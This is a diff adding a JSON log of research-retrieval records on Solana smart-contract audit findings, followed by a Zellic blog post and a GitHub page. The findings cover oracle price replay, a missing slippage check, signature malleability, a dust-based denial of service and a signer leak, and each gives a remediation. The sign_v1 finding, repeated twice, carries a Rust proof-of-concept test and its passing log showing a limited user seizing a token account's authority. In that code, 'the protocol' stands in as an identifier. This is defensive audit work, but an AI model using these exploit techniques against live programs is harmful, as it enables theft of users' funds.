@@ -1,0 +1,849 @@
+[
+  {
+    "record_id": "thread_1/research_search/1/1",
+    "slot_id": "thread_1",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "SS-03738",
+        "kind": "kb",
+        "url": null,
+        "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+        "retrieved_at": "2026-10-24T00:21:11.858683Z",
+        "published_at": null,
+        "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03740",
+        "kind": "kb",
+        "url": null,
+        "title": "Swap Instruction Lacks Slippage Protection",
+        "retrieved_at": "2026-10-24T00:21:11.860038Z",
+        "published_at": null,
+        "evidence_text": "Swap Instruction Lacks Slippage Protection\nWe found that the **swap instruction** depends on several invariants to calculate fair exchange rates:\n\n- Current oracle prices ( `sol_usd_pyth_feed` )\n\n- Current token supplies ( `levercoin_mint.supply` )\n\n- Current protocol state (e.g., total SOL, collateral ratio)\n\nThis makes it **vulnerable to frontrunning attacks** . Currently, there is **no slippage protection mechanism** to guard against this.\nAdd a **slippage check** to the swap instruction so that the user specifies a minimum acceptable output. If the actual result falls below this bound, the transaction should revert.",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03706",
+        "kind": "kb",
+        "url": null,
+        "title": "`secp256k1` Is Vulnerable to Signature Malleability and Replay Attacks",
+        "retrieved_at": "2026-10-24T00:21:11.862049Z",
+        "published_at": null,
+        "evidence_text": "`secp256k1` Is Vulnerable to Signature Malleability and Replay Attacks\nWe found that the `secp256k1_authenticate` implementation is vulnerable to two issues:\n\n1. **Replay Attack**: The signature is not enforced to be single-use, allowing the same signature to be reused multiple times for authorization, this could lead to unauthorized repeated operations.\n\n2. **Signature Malleability**: The implementation does not enforce that the `S` value of the signature is in low-order form. This allows alternative valid signatures for the same message, making it possible to modify a signature without invalidating it. This undermines signature uniqueness and opens the door to replay in different contexts or manipulation of signed payloads. See [Solana SDK secp256k1\\_recover - Signature Malleability](https://docs.rs/solchainsaw/latest/sol_chainsaw/solana_sdk/secp256k1_recover/fn.secp256k1_recover.html#signature-malleability) for reference.\n\u2022 **Prevent Replay Attacks**: Introduce a mechanism (e.g. nonce tracking, on-chain replay protection) to ensure each signature is accepted only once. \u2022 **Prevent Signature Malleability**: Reject signatures where the `S` component is not in low-order",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03699",
+        "kind": "kb",
+        "url": null,
+        "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+        "retrieved_at": "2026-10-24T00:21:11.868153Z",
+        "published_at": null,
+        "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+        "status": "ok"
+      },
+      {
+        "source_id": "SS-03703",
+        "kind": "kb",
+        "url": null,
+        "title": "`sub_account_sign_v1` and `sign_v1` Passes Session Authorities as Signers During CPI Calls",
+        "retrieved_at": "2026-10-24T00:21:11.870046Z",
+        "published_at": null,
+        "evidence_text": "`sub_account_sign_v1` and `sign_v1` Passes Session Authorities as Signers During CPI Calls\nWe found that in `sub_account_sign_v1` and `sign_v1`, session-based authorities are not added to the `restricted_keys` list. As a result, these accounts are mistakenly passed as signers in downstream CPI calls, which can unintentionally grant them authority.\nUpdate the logic to correctly restrict signers based on the authority type. Only `Secp256k1` doesn't have the authority. All other authority types must include both the payer and the session authority:\n\n```\nlet rkeys: &[&Pubkey] = unsafe {\n    if role.position.authority_type()? == AuthorityType::Secp256k1 {\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 1)\n    } else {\n        let authority_index = *sign_v1.authority_payload.get_unchecked(0) as usize;\n        restricted_keys[0].write(ctx.accounts.payer.key());\n        restricted_keys[1].write(all_accounts[authority_index].key());\n        core::slice::from_raw_parts(restricted_keys.as_ptr() as _, 2)\n    }\n};\n```",
+        "status": "ok"
+      }
+    ],
+    "action": "search_kb",
+    "query": "oracle manipulation",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_1/research/1/1",
+    "slot_id": "thread_1",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_1",
+      "topic_id": "SS-03738",
+      "topic_name": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+      "sources": [
+        {
+          "source_id": "SS-03738",
+          "kind": "kb",
+          "url": null,
+          "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+          "retrieved_at": "2026-10-24T00:21:11.858683Z",
+          "published_at": null,
+          "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03738",
+        "kind": "kb",
+        "url": null,
+        "title": "Non-Canonical Price Feeds Allow Historical Price Manipulation",
+        "retrieved_at": "2026-10-24T00:21:11.858683Z",
+        "published_at": null,
+        "evidence_text": "Non-Canonical Price Feeds Allow Historical Price Manipulation\nWe found that the protocol does **not enforce canonical accounts** for `sol_usd_pyth_feed` . Any account with the same `feed ID` can be submitted, allowing anyone to create a `PriceUpdateV2` account and publish historical prices. For example, with a 5-minute age window:\n\n- Transaction 1 uses price `t2` (latest).\n\n- Transaction 2 uses price `t1` (older, t1 < t2) from a custom account.\n\nWhile the protocol correctly validates publish and update times, this issue allows users to submit historical valid prices within the allowed time window (which was configured to be 60s), potentially manipulating outcomes.\n- Use a **canonical feed account** managed and sponsored by Pyth.\n\n- Alternatively, use a **personal, persistent account** that you control and update yourself.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_2/research/1/1",
+    "slot_id": "thread_2",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_2",
+      "topic_id": "SS-03699",
+      "topic_name": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+      "sources": [
+        {
+          "source_id": "SS-03699",
+          "kind": "kb",
+          "url": null,
+          "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+          "retrieved_at": "2026-10-24T00:21:20.457310Z",
+          "published_at": null,
+          "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03699",
+        "kind": "kb",
+        "url": null,
+        "title": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions",
+        "retrieved_at": "2026-10-24T00:21:20.457310Z",
+        "published_at": null,
+        "evidence_text": "`sign_v1` Allows Malicious Instructions on Accounts Without Proper Restrictions\nWe found that the `sign_v1` instruction does not restrict which instructions can be executed against accounts. This means that a user with limited permissions\u2014such as a `TokenLimit` on a specific mint\u2014can submit malicious instructions that interact with all accounts in ways not covered by their role.\n\n**Example Attack:**\n\nA user with `TokenLimit` permission on mint `[0; 32]` and amount `1` can submit a `SetAuthority` instruction on the token account. Since this operation does not change the token balance, the permission system passes, yet the attacker gains ownership of the token account. Or even the user with no Permission at all could do this because the function only checks for permission if the balance changed.\n\nThis vulnerability extends beyond token accounts. Similar unauthorised actions could be executed on:\n\n\u2022 Stake accounts (e.g., transferring authority, modifying lockups) \u2022 Any account where the action doesn't affect the balance but modifies control or behaviour.\n\n**POC Summary**\n\nIn this poc, second_authority has TokenLimit permission for token [0;32] and amount 1, but it transfers the token account authority to itself.\n\n```\n#[test_log::test]\nfn test_transfer_tokens_with_mixed_permissions() {\n    let mut context = setup_test_context().unwrap();\n    let protocol_authority = Keypair::new();\n    context\n        .svm\n        .airdrop(&protocol_authority.pubkey(), 10_000_000_000)\n        .unwrap();\n    let id = rand::random::<[u8; 32]>();\n    let the protocol = Pubkey::find_program_address(&protocol_account_seeds(&id), &program_id()).0;\n    context.svm.warp_to_slot(10);\n    // Setup token infrastructure\n    let mint_pubkey = setup_mint(&mut context.svm, &context.default_payer).unwrap();\n    let protocol_ata = setup_ata(\n        &mut context.svm,\n        &mint_pubkey,\n        &the protocol,\n        &context.default_payer,\n    )\n    .unwrap();\n    mint_to(\n        &mut context.svm,\n        &mint_pubkey,\n        &context.default_payer,\n        &protocol_ata,\n        1000,\n    )\n    .unwrap();\n    let protocol_create_txn = create_protocol_ed25519(&mut context, &protocol_authority, id);\n    assert!(protocol_create_txn.is_ok());\nlet second_authority = Keypair::new();\ncontext\n    .svm\n    .airdrop(&second_authority.pubkey(), 10_000_000_000)\n    .unwrap();\nadd_authority_with_ed25519_root(\n    &mut context,\n    &the protocol,\n    &protocol_authority,\n    AuthorityConfig {\n        authority_type: AuthorityType::Ed25519,\n        authority: second_authority.pubkey().as_ref(),\n    },\n    vec![ClientAction::TokenLimit(TokenLimit {\n        token_mint: [0; 32],\n        current_amount: 1,\n    })],\n)\n.unwrap();\ncontext.svm.warp_to_slot(100);\nlet token_ix = Instruction {\n    program_id: spl_token::id(),\n    accounts: vec![\n        AccountMeta::new(protocol_ata, false),\n        AccountMeta::new(the protocol, false),\n    ],\n    data: TokenInstruction::SetAuthority {\n        authority_type: spl_token::instruction::AuthorityType::AccountOwner,\n        new_authority: Some(second_authority.pubkey()).into(),\n    }\n    .pack(),\n};\nlet account = context.svm.get_account(&protocol_ata).unwrap();\nlet token_account = spl_token::state::Account::unpack(&account.data).unwrap();\nprintln!(\"pk: {} account: {:?}\", protocol_ata, token_account);\nlet sign_ix = protocol_interface::SignInstruction::new_ed25519(\n    the protocol,\n    second_authority.pubkey(),\n    second_authority.pubkey(),\n    token_ix,\n    1,\n)\n.unwrap();\nlet transfer_message = v0::Message::try_compile(\n    &second_authority.pubkey(),\n    &[sign_ix],\n    &[],\n    context.svm.latest_blockhash(),\n)\n.unwrap();\nlet transfer_tx =\n    VersionedTransaction::try_new(VersionedMessage::V0(transfer_message), &[&second_authority])\n        .unwrap();\nlet res = context.svm.send_transaction(transfer_tx);\nif res.is_err() {\n    let e = res.unwrap_err();\n    println!(\"Logs {} - {:?}\", e.err, e.meta.logs);\n}\n// assert!(res.is_ok());\nlet protocol_token_account = context.svm.get_account(&protocol_ata).unwrap();\nlet protocol_token_balance = spl_token::state::Account::unpack(&protocol_token_account.data).unwrap();\nlet protocol_token_account_owner = protocol_token_balance.owner;\nassert_eq!(protocol_token_account_owner, second_authority.pubkey());\n```\n\n`assert_eq!(protocol_token_balance.amount, 1000); }` Logs:\n\n```\n       START             the protocol::sign test_transfer_tokens_with_mixed_permissions\nrunning 1 test\nprogram_id: <program id>\nprogram_id 2: <program id>\npk: <program id> account: Account { mint: <program id>\nDW2eG7hj1uBS, owner: <program id>, amount: 1000, delegate: None, state: In\nitialized, is_native: None, delegated_amount: 0, close_authority: None }\ntest test_transfer_tokens_with_mixed_permissions ... ok\ntest result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 6 filtered out; finished in 0.31s\nPASS [   0.317s] the protocol::sign test_transfer_tokens_with_mixed_permissions\n```\nRestrict instruction types and actions per account type. Only allow explicitly approved and verifiable operations based on the assigned role. For example:\n\n\u2022 For token accounts: only allow `Transfer` , `Burn` (with limits), etc. ...",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "thread_3/research/1/1",
+    "slot_id": "thread_3",
+    "attempt": 1,
+    "pack": {
+      "slot_id": "thread_3",
+      "topic_id": "SS-03897",
+      "topic_name": "Anyone can dust a stake vault and permanently block unstaking",
+      "sources": [
+        {
+          "source_id": "SS-03897",
+          "kind": "kb",
+          "url": null,
+          "title": "Anyone can dust a stake vault and permanently block unstaking",
+          "retrieved_at": "2026-10-24T00:21:20.487899Z",
+          "published_at": null,
+          "evidence_text": "Anyone can dust a stake vault and permanently block unstaking\n`unstake` transfers only the principal recorded in `StakeAccount` and then unconditionally closes the vault, even though the vault can receive unsolicited token transfers. Any holder of the pool mint can send one base unit to a victim\u2019s publicly derivable vault; the resulting nonzero remainder makes `CloseAccount` fail and atomically rolls back every withdrawal attempt, while no instruction can sweep the excess.\nIn step 1, transfer the full token account balance to the staker, instead of the recorded balance.",
+          "status": "ok"
+        }
+      ],
+      "kb_allowed": false
+    },
+    "evidence": [
+      {
+        "source_id": "SS-03897",
+        "kind": "kb",
+        "url": null,
+        "title": "Anyone can dust a stake vault and permanently block unstaking",
+        "retrieved_at": "2026-10-24T00:21:20.487899Z",
+        "published_at": null,
+        "evidence_text": "Anyone can dust a stake vault and permanently block unstaking\n`unstake` transfers only the principal recorded in `StakeAccount` and then unconditionally closes the vault, even though the vault can receive unsolicited token transfers. Any holder of the pool mint can send one base unit to a victim\u2019s publicly derivable vault; the resulting nonzero remainder makes `CloseAccount` fail and atomically rolls back every withdrawal attempt, while no instruction can sweep the excess.\nIn step 1, transfer the full token account balance to the staker, instead of the recorded balance.",
+        "status": "ok"
+      }
+    ],
+    "action": "resolved",
+    "query": "",
+    "query_attempts": [],
+    "url_events": [],
+    "failure": null
+  },
+  {
+    "record_id": "marketing_3/research_search/1/1",
+    "slot_id": "marketing_3",
+    "attempt": 1,
+    "pack": null,
+    "evidence": [
+      {
+        "source_id": "WEB-d41df0417a0182fc",
+        "kind": "web",
+        "url": "https://www.zellic.io/blog/audit-drift",
+        "title": "You Could Have Found the Nomad Hack | Zellic \u2014 Research",
+        "retrieved_at": "2026-10-24T00:21:22.063891Z",
+        "published_at": null,
+        "evidence_text": "![](/blog/img/zellic-symbol-type-logo.svg)\n\n# You Could Have Found the Nomad Hack\n\n![Article heading](/blog/img/article_heading.svg)\n\nIn August 2022, the Nomad token bridge was\n[exploited\u2197](https://rekt.news/nomad-rekt/) for $190M. What\u2019s interesting\nis that anyone could have pinpointed the vulnerable code relatively\neasily. That\u2019s because the vulnerable code was unaudited.\n\nWe\u2019ve built a tool, called the [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which tracks what code is audited and\nunaudited for the biggest DeFi protocols. In this blog post, we\u2019ll\nexplore how the Nomad bridge bug could have been spotted months ahead of\ntime.\n\n## Introduction[\u200b](/blog/audit-drift#introduction \"Direct link to Introduction\")\n\nOf the top 20 hacks currently on the [Rekt\nLeaderboard\u2197](https://rekt.news/leaderboard), 15 out of 20 were unaudited\n(including Nomad). While audits are not a perfect or complete solution\nto smart contract security, they are nonetheless a valuable line of\ndefense. Unaudited code is much more likely than audited code to contain\nbugs or security vulnerabilities. That\u2019s because in an audit, the scoped\ncode is reviewed by a team of security professionals who are experts at\nfinding bugs. And when hunting for bugs, attackers like to start by\nlooking in places that no one else has\u2013i.e., unaudited code.\n\nIn the case of Nomad, the bridge was [audited by\nQuantstamp\u2197](https://certificate.quantstamp.com/full/nomad) in June 2022.\nAccording to Quantstamp, the buggy code responsible for the hack was\nintroduced [after the audit had\nbegun\u2197](https://twitter.com/Quantstamp/status/1554348545812996096). In\nother words, the smart contract code that was ultimately deployed\n**differed from the audited code**! And it was in this later-introduced\ncode that a fatal bug was present.\n\nThis issue, or *audit drift*, is a well-known problem throughout the\nWeb3 security industry. However, to the best of our knowledge, no one is\ntracking the on-chain audit drift of popular DeFi and Web3 protocols!\nThere are billions of dollars locked in potentially unaudited code. This\nposes a serious, ongoing security risk to the community.\n\nTo solve this problem, we\u2019ve developed an [Audit Coverage\nTracker\u2197](https://app.zellic.io/), which we\u2019ve made publicly available\nfor the community to use. We\u2019ve also analyzed several popular, large\nDeFi applications for audit drift and added them to the tracker. We\ninvite the community to explore the results and share feedback.\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\n![](https://blog-cdn.zellic.io/blog/assets/images/63741920c01b13dc7eae10e6_upload_0d7540c1e1984c444f6a45954c586ab2[1]-276d72e1c8dabfa73ffa6100c680cdc9.png)\n\nOn the tracker, you may also [suggest additional\nprojects\u2197](https://app.zellic.io/new) for tracking. For now, this feature\nis in beta, and submissions are manually reviewed for accuracy.\nDepending on community in",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-cc2a7610a7c21f25",
+        "kind": "web",
+        "url": "https://github.com/topics/smart-contract-security?o=desc&s=forks",
+        "title": "smart-contract-security \u00b7 GitHub Topics \u00b7 GitHub",
+        "retrieved_at": "2026-10-24T00:21:22.063959Z",
+        "published_at": null,
+        "evidence_text": "[Skip to content](#start-of-content)   \n \n \n\n## Navigation Menu\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Fsmart-contract-security%3Fo%3Ddesc%26s%3Dforks)\n\nAppearance settings\n\n[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Ftopics%2Fsmart-contract-security%3Fo%3Ddesc%26s%3Dforks)\n\n[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Ftopics%2Fsmart-contract-security&source=header)\n\nAppearance settings\n\nYou signed in with another tab or window. Reload to refresh your session. You signed out in another tab or window. Reload to refresh your session. You switched accounts on another tab or window. Reload to refresh your session. Dismiss alert\n\n{{ message }}\n\n#\n\n# smart-contract-security\n\n[Star](/login?return_to=%2Ftopic.smart-contract-security)\n\n## Here are 359 public repositories matching this topic...\n\n*Language:* All  \n\nFilter by language\n\n[All 359](https://github.com/topics/smart-contract-security?o=desc&s=forks)   [Solidity 112](https://github.com/topics/smart-contract-security?l=solidity&o=desc&s=forks)   [Python 58](https://github.com/topics/smart-contract-security?l=python&o=desc&s=forks)   [JavaScript 36](https://github.com/topics/smart-contract-security?l=javascript&o=desc&s=forks)   [TypeScript 27](https://github.com/topics/smart-contract-security?l=typescript&o=desc&s=forks)   [Rust 18](https://github.com/topics/smart-contract-security?l=rust&o=desc&s=forks)   [HTML 5](https://github.com/topics/smart-contract-security?l=html&o=desc&s=forks)   [C++ 2](https://github.com/topics/smart-contract-security?l=c%2B%2B&o=desc&s=forks)   [Go 2](https://github.com/topics/smart-contract-security?l=go&o=desc&s=forks)   [TeX 2](https://github.com/topics/smart-contract-security?l=tex&o=desc&s=forks)   [Move 2](https://github.com/topics/smart-contract-security?l=move&o=desc&s=forks)\n\n    *Sort:* Most forks  \n\nSort options\n\n[Most stars](/topics/smart-contract-security?o=desc&s=stars)   [Fewest stars](/topics/smart-contract-security?o=asc&s=stars)   [Most forks](/topics/smart-contract-security?o=desc&s=forks)   [Fewest forks](/topics/smart-contract-security?o=asc&s=forks)   [Recently updated](/topics/smart-contract-security?o=desc&s=updated)   [Least recently updated](/topics/smart-contract-security?o=asc&s=updated)\n\n### [pashov](/pashov) / [skills](/pashov/skills)\n\n[Star  1.2k](/login?return_to=%2Fpashov%2Fskills)\n\nPashov Audit Group Skills\n\n[fuzzing](/topics/fuzzing \"Topic: fuzzing\") [fuzz-testing](/topics/fuzz-testing \"Topic: fuzz-testing\") [web3](/topics/web3 \"Topic: web3\") [ai-agents](/topics/ai-agents \"Topic: ai-agents\") [security-research](/topics/security-research \"Topic: security-research\") [ai-security](/topics/ai-security \"Topic: ai-security\") [smart-contract-security](/topics/smart-contract-security \"Topic: smart-contract-security\") [smart-contract-audit](/topics/smart-contract-audit \"Topic: smart-contract-audit\") [solidity-audit](/topics/solidity-audit \"Topic: solidity-audit\") [defi-security](/topic",
+        "status": "ok"
+      },
+      {
+        "source_id": "WEB-77a12824b1bd25da",
+        "kind": "web",
+        "url": "https://github.com/dawidosX/ANL-Protocol/blob/main/docs/SECURITY-AUDITS.md",
+        "title": "ANL-Protocol/docs/SECURITY-AUDITS.md at main \u00b7 dawidosX/ANL-Protocol \u00b7 GitHub",
